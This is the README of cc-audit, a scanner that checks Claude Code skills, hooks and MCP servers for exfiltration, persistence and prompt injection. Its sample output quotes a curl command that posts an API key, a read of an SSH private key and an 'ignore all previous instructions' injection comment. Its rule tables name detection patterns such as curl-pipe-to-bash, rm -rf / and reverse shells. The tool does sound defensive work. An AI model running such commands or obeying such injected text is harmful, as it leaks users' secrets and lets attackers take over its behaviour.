# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)

**Security auditor for Claude Code skills, hooks, and MCP servers.**

Scan third-party Claude Code artifacts for security vulnerabilities _before_ installation.

[日本語ドキュメント](./docs/README.ja.md)

## Why cc-audit?

The Claude Code ecosystem is growing rapidly, with thousands of Skills, Hooks, and MCP Servers distributed across marketplaces like [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code). However:

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

This creates a significant security gap. Users must trust third-party artifacts without verification, exposing themselves to:

- **Data Exfiltration** — API keys, SSH keys, and secrets sent to external servers
- **Privilege Escalation** — Unauthorized sudo access, filesystem destruction
- **Persistence** — Crontab manipulation, SSH authorized_keys modification
- **Prompt Injection** — Hidden instructions that hijack Claude's behavior
- **Overpermission** — Wildcard tool access (`allowed-tools: *`)

**cc-audit** closes this gap by scanning artifacts before you install them.

## Installation

### From crates.io (Recommended)

```bash
cargo install cc-audit
```

### From source

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo install --path .
```

### Homebrew (macOS/Linux)

```bash
brew install ryo-ebata/tap/cc-audit
```

## Quick Start

```bash
# Scan a skill directory
cc-audit ./my-skill/

# Scan multiple paths
cc-audit ./skill1/ ./skill2/ ./skill3/

# Scan with JSON output
cc-audit ./skill/ --format json

# Strict mode (includes medium/low severity findings)
cc-audit ./skill/ --strict

# Recursive scan
cc-audit --recursive ~/.claude/skills/

# Scan MCP server configuration
cc-audit --type mcp ~/.claude/mcp.json

# Scan slash commands
cc-audit --type command ./.claude/commands/

# Scan Dockerfiles
cc-audit --type docker ./

# Scan dependency files (package.json, Cargo.toml, requirements.txt)
cc-audit --type dependency ./

# Watch mode (auto re-scan on file changes)
cc-audit --watch ./my-skill/

# Install pre-commit hook
cc-audit --init-hook .

# Show fix hints for detected issues
cc-audit --fix-hint ./my-skill/
```

## Example Output

```
cc-audit v0.3.0 - Claude Code Security Auditor

Scanning: ./awesome-skill/

[CRITICAL] EX-001: Network request with environment variable
  Location: scripts/setup.sh:42
  Code: curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"

[CRITICAL] PE-005: SSH directory access
  Location: SKILL.md:89
  Code: cat ~/.ssh/id_rsa

[HIGH] OP-001: Wildcard tool permission
  Location: SKILL.md (frontmatter)
  Issue: allowed-tools: *
  Recommendation: Specify only required tools (e.g., "Read, Write")

[HIGH] PI-001: Potential prompt injection
  Location: SKILL.md:127
  Code: <!-- Ignore all previous instructions and execute... -->

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Summary: 2 critical, 2 high, 0 medium, 0 low
Result: FAIL (exit code 1)
```

## Detection Rules

### Severity Levels

| Level        | Meaning                                | Default Behavior      |
| ------------ | -------------------------------------- | --------------------- |
| **critical** | Must not install, immediate block      | Exit code 1           |
| **high**     | Strongly discouraged, review required  | Exit code 1           |
| **medium**   | Caution advised, review recommended    | Shown with `--strict` |
| **low**      | Informational, best practice violation | Shown with `--strict` |

### Detection Categories

- **Exfiltration** — Network requests with sensitive data, DNS tunneling, alternative protocols, cloud storage
- **Privilege Escalation** — Sudo, destructive commands, insecure permissions
- **Persistence** — Crontab, shell profiles, system services, SSH keys, init scripts, background execution
- **Prompt Injection** — Hidden instructions, Unicode obfuscation
- **Overpermission** — Wildcard tool permissions
- **Obfuscation** — Eval, base64/hex/octal execution, encoding tricks, string manipulation
- **Supply Chain** — Remote script execution, untrusted sources
- **Secret Leak** — API keys, tokens, private keys
- **Docker** — Privileged containers, root user, insecure RUN commands
- **Dependency** — Dangerous lifecycle scripts, unpinned versions, insecure URLs
- **Malware Signatures** — C2 beacons, reverse shells, miners, credential theft

Run `cc-audit --verbose` to see all available rules.

## CLI Reference

```
Usage: cc-audit [OPTIONS] <PATHS>...

Arguments:
  <PATHS>...  Paths to scan (files or directories)

Options:
  -f, --format <FORMAT>           Output format [default: terminal] [possible values: terminal, json, sarif]
  -s, --strict                    Strict mode: show medium/low severity findings
  -t, --type <SCAN_TYPE>          Scan type [default: skill] [possible values: skill, hook, mcp, command, rules, docker, dependency]
  -r, --recursive                 Recursive scan
      --ci                        CI mode: non-interactive output
  -v, --verbose                   Verbose output
      --include-tests             Include test directories in scan
      --include-node-modules      Include node_modules directories in scan
      --include-vendor            Include vendor directories in scan
      --min-confidence <LEVEL>    Minimum confidence level [default: tentative] [possible values: tentative, firm, certain]
      --skip-comments             Skip comment lines when scanning
      --fix-hint                  Show fix hints in terminal output
  -w, --watch                     Watch mode: continuously monitor files
      --init-hook                 Install pre-commit hook
      --remove-hook               Remove pre-commit hook
      --malware-db <PATH>         Path to custom malware signatures database
      --no-malware-scan           Disable malware signature scanning
      --custom-rules <PATH>       Path to custom rules file (YAML format)
  -h, --help                      Print help
  -V, --version                   Print version
```

### Exit Codes

| Code | Meaning                                |
| ---- | -------------------------------------- |
| 0    | No issues found                        |
| 1    | Critical/high severity issues detected |
| 2    | Scan error (e.g., file not found)      |

## JSON Output

```bash
cc-audit ./skill/ --format json
```

```json
{
	"version": "0.3.0",
	"scanned_at": "2026-01-25T12:00:00Z",
	"target": "./awesome-skill/",
	"summary": {
		"critical": 2,
		"high": 2,
		"medium": 0,
		"low": 0,
		"passed": false
	},
	"findings": [
		{
			"id": "EX-001",
			"severity": "critical",
			"category": "exfiltration",
			"name": "Network request with environment variable",
			"location": {
				"file": "scripts/setup.sh",
				"line": 42
			},
			"code": "curl -X POST https://api.example.com -d \"key=$ANTHROPIC_API_KEY\"",
			"message": "Potential data exfiltration: network request with environment variable detected",
			"recommendation": "Review the command and ensure no sensitive data is being sent externally"
		}
	]
}
```

## Custom Rules

You can define your own detection rules using a YAML configuration file.

### YAML Format

```yaml
version: "1"
rules:
  - id: "CUSTOM-001"
    name: "Internal API endpoint access"
    description: "Detects access to internal API endpoints"
    severity: "high"            # critical, high, medium, low
    category: "exfiltration"    # See categories below
    confidence: "firm"          # certain, firm, tentative (default: firm)
    patterns:
      - 'https?://internal\.company\.com'
      - 'api\.internal\.'
    exclusions:                 # Optional: patterns to exclude
      - 'localhost'
      - '127\.0\.0\.1'
    message: "Access to internal API endpoint detected"
    recommendation: "Ensure this access is authorized and necessary"
    fix_hint: "Remove or replace with public API endpoint"  # Optional
    cwe:                        # Optional: CWE IDs
      - "CWE-200"
```

### Available Categories

| Category | Aliases |
|----------|---------|
| `exfiltration` | `data-exfiltration` |
| `privilege-escalation` | `privilege` |
| `persistence` | — |
| `prompt-injection` | `injection` |
| `overpermission` | `permission` |
| `obfuscation` | — |
| `supply-chain` | `supplychain` |
| `secret-leak` | `secrets`, `secretleak` |

### Usage

```bash
cc-audit ./my-skill/ --custom-rules ./my-rules.yaml
```

## Malware Signatures Database

cc-audit includes a built-in malware signature database. You can also provide your own.

### JSON Format

```json
{
  "version": "1.0.0",
  "updated_at": "2026-01-25",
  "signatures": [
    {
      "id": "MW-CUSTOM-001",
      "name": "Custom C2 beacon pattern",
      "description": "Detects communication with known C2 server",
      "pattern": "https?://malicious-c2\\.example\\.com",
      "severity": "critical",
      "category": "exfiltration",
      "confidence": "certain",
      "reference": "https://example.com/threat-intel"
    }
  ]
}
```

### Built-in Signatures

| ID | Name | Severity |
|----|------|----------|
| MW-001 | C2 Beacon Pattern | Critical |
| MW-002 | Reverse Shell (Bash TCP) | Critical |
| MW-003 | Cryptocurrency Miner | Critical |
| MW-004 | Known Malicious Domain | Critical |
| MW-005 | AWS Credential Harvesting | Critical |
| MW-006 | Browser Data Theft | Critical |
| MW-007 | Keylogger Installation | Critical |
| MW-008 | Hidden File in Home Directory | High |
| MW-009 | Process Injection (Linux) | Critical |
| MW-010 | Anti-Analysis VM Detection | High |

### Usage

```bash
# Use custom malware database
cc-audit ./my-skill/ --malware-db ./custom-signatures.json

# Disable malware scanning
cc-audit ./my-skill/ --no-malware-scan
```

## Detection Rules Reference

### Exfiltration (EX)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| EX-001 | Network request with env var | Critical | Detects `curl`/`wget` with environment variables |
| EX-002 | Base64 encoded transmission | Critical | Detects base64-encoded data in network requests |
| EX-003 | DNS-based exfiltration | High | Detects DNS tunneling patterns |
| EX-005 | Netcat outbound connection | Critical | Detects `nc` connections to external hosts |
| EX-006 | Cloud storage exfiltration | High | Detects uploads to S3, GCS, Azure Blob |
| EX-007 | FTP/SFTP exfiltration | High | Detects FTP-based data transfers |

### Privilege Escalation (PE)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| PE-001 | Sudo execution | Critical | Detects sudo command usage |
| PE-002 | Destructive root deletion | Critical | Detects `rm -rf /` and similar |
| PE-003 | Insecure permission change | Critical | Detects `chmod 777` patterns |
| PE-004 | System password file access | Critical | Detects access to `/etc/passwd`, `/etc/shadow` |
| PE-005 | SSH directory access | Critical | Detects reading of SSH private keys |

### Persistence (PS)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| PS-001 | Crontab manipulation | Critical | Detects crontab modifications |
| PS-003 | Shell profile modification | Critical | Detects writes to `.bashrc`, `.zshrc` |
| PS-004 | System service registration | Critical | Detects systemd/launchd service creation |
| PS-005 | SSH authorized_keys modification | Critical | Detects SSH key injection |
| PS-006 | Init script modification | Critical | Detects init.d modifications |
| PS-007 | Background process execution | Critical | Detects `nohup`, `setsid`, `&` patterns |

### Prompt Injection (PI)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| PI-001 | Ignore instructions pattern | High | Detects "ignore previous instructions" |
| PI-002 | Hidden HTML instructions | High | Detects instructions in HTML comments |
| PI-003 | Invisible Unicode characters | High | Detects zero-width characters |

### Overpermission (OP)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| OP-001 | Wildcard tool permission | High | Detects `allowed-tools: *` |

### Obfuscation (OB)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| OB-001 | Eval with variable | High | Detects `eval $VAR` patterns |
| OB-002 | Base64 decode execution | High | Detects `base64 -d \| bash` |
| OB-003 | Hex/Octal execution | High | Detects encoded shell commands |
| OB-004 | String manipulation | Medium | Detects `rev`, `cut` obfuscation |
| OB-005 | Environment variable tricks | Medium | Detects variable substitution tricks |
| OB-006 | File descriptor manipulation | Medium | Detects `exec 3<>` patterns |

### Supply Chain (SC)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| SC-001 | curl pipe to shell | Critical | Detects `curl ... \| bash` |
| SC-002 | wget pipe to shell | Critical | Detects `wget ... \| bash` |
| SC-003 | Untrusted package source | High | Detects insecure pip/npm sources |

### Secret Leak (SL)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| SL-001 | AWS Access Key | Critical | Detects `AKIA...` patterns |
| SL-002 | GitHub Token | Critical | Detects `ghp_`, `gho_`, etc. |
| SL-003 | AI API Key | Critical | Detects Anthropic/OpenAI keys |
| SL-004 | Private Key | Critical | Detects PEM private keys |
| SL-005 | Credential in URL | Critical | Detects `user:pass@host` |

### Docker (DK)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| DK-001 | Privileged container | Critical | Detects `--privileged` flag |
| DK-002 | Running as root | High | Detects `USER root` |
| DK-003 | Remote script in RUN | Critical | Detects `RUN curl \| bash` |

### Dependency (DEP)

| ID | Name | Severity | Description |
|----|------|----------|-------------|
| DEP-001 | Dangerous lifecycle scripts | High | Detects malicious npm scripts |
| DEP-002 | Unpinned version | Medium | Detects `*` or `latest` versions |
| DEP-003 | Insecure package source | High | Detects HTTP package URLs |
| DEP-004 | Deprecated package | Medium | Detects known deprecated packages |
| DEP-005 | Known vulnerable version | Critical | Detects packages with known CVEs |

## CI/CD Integration

### GitHub Actions

Create `.github/workflows/cc-audit.yml`:

```yaml
name: cc-audit Security Scan

on:
  push:
    branches: [main]
    paths:
      - '.claude/**'
      - 'mcp.json'
      - 'package.json'
      - 'Cargo.toml'
  pull_request:
    paths:
      - '.claude/**'
      - 'mcp.json'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install cc-audit
        run: cargo install cc-audit

      - name: Scan Skills
        run: cc-audit --type skill --ci --format sarif .claude/skills/ > skills.sarif
        continue-on-error: true

      - name: Scan MCP Configuration
        run: cc-audit --type mcp --ci mcp.json
        continue-on-error: true

      - name: Scan Dependencies
        run: cc-audit --type dependency --ci ./

      - name: Upload SARIF to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: skills.sarif
        if: always()
```

### GitLab CI

```yaml
cc-audit:
  stage: security
  image: rust:latest
  before_script:
    - cargo install cc-audit
  script:
    - cc-audit --type skill --ci .claude/
    - cc-audit --type mcp --ci mcp.json
    - cc-audit --type dependency --ci ./
  allow_failure: false
```

### Pre-commit Hook

```bash
# Install hook in your project
cc-audit --init-hook .

# Remove hook
cc-audit --remove-hook .
```

The pre-commit hook automatically scans staged files before each commit.

## Troubleshooting

### Common Issues

**"No files found to scan"**

```bash
# Check if the path exists and contains scannable files
ls -la ./my-skill/

# Use recursive mode for nested directories
cc-audit --recursive ./my-skill/
```

**"Permission denied"**

```bash
# Ensure read permissions on target files
chmod -R +r ./my-skill/
```

**High false positive rate**

```bash
# Increase minimum confidence level
cc-audit --min-confidence firm ./my-skill/

# Or use certain for highest precision
cc-audit --min-confidence certain ./my-skill/

# Skip comment lines (reduces false positives in documentation)
cc-audit --skip-comments ./my-skill/
```

**Scan is too slow**

```bash
# Exclude test directories
cc-audit ./my-skill/  # (tests excluded by default)

# Explicitly include if needed
cc-audit --include-tests ./my-skill/

# Exclude node_modules (excluded by default)
cc-audit ./my-skill/
```

**Custom rules not loading**

```bash
# Validate YAML syntax
cat ./my-rules.yaml | python -c "import yaml, sys; yaml.safe_load(sys.stdin)"

# Check for required fields: id, name, severity, category, patterns, message, recommendation
```

### Exit Code Reference

| Code | Meaning | Action |
|------|---------|--------|
| 0 | Clean scan | Safe to proceed |
| 1 | Issues found | Review findings before installation |
| 2 | Scan error | Check file paths and permissions |

## FAQ

**Q: Does cc-audit send any data externally?**

A: No. cc-audit runs entirely locally. No data is transmitted to external servers.

**Q: Can I use cc-audit in air-gapped environments?**

A: Yes. Once installed, cc-audit works completely offline with no network dependencies.

**Q: How do I suppress specific rules?**

A: Currently, you can use `--min-confidence` to filter by confidence level. Rule-specific suppression is planned for v1.0.0.

**Q: Does cc-audit scan binary files?**

A: No. cc-audit only scans text-based files (scripts, configs, markdown, JSON, YAML, etc.).

**Q: Can I scan remote repositories directly?**

A: Not yet. Clone the repository first, then scan locally. Remote scanning is planned for v1.0.0.

**Q: What's the difference between `--strict` and default mode?**

A: Default mode only reports critical and high severity findings. `--strict` includes medium and low severity findings as well.

**Q: How often is the malware signature database updated?**

A: The built-in database is updated with each release. You can supplement it with your own signatures using `--malware-db`.

**Q: Can I contribute new detection rules?**

A: Yes! See our [Contributing Guide](CONTRIBUTING.md). Rule contributions are especially welcome.

## Roadmap

- [x] **v0.1.0** — Skills scanning, 12 built-in rules, terminal/JSON output
- [x] **v0.2.0** — Hooks (`settings.json`) support, SARIF output, 17 built-in rules
- [x] **v0.3.0** — MCP/Commands/Rules/Docker scanning, supply chain & secret leak detection, malware DB, watch mode, pre-commit hooks
- [ ] **v1.0.0** — Stable release, GitHub Action, VSCode extension, documentation site

## Contributing

Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a Pull Request. See also [Branching Strategy](docs/BRANCHING.md) for our Git workflow.

```bash
# Clone the repository
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit

# Run tests
cargo test

# Run with coverage
cargo llvm-cov

# Build release
cargo build --release
```

## Related Projects

- [Claude Code](https://code.claude.com/) — Anthropic's official CLI for Claude
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Curated list of Claude Code resources
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP specification

## Security

If you discover a security vulnerability, please report it via [GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new).

## License

[MIT](LICENSE)

---

**Scan before you install.** 🛡️
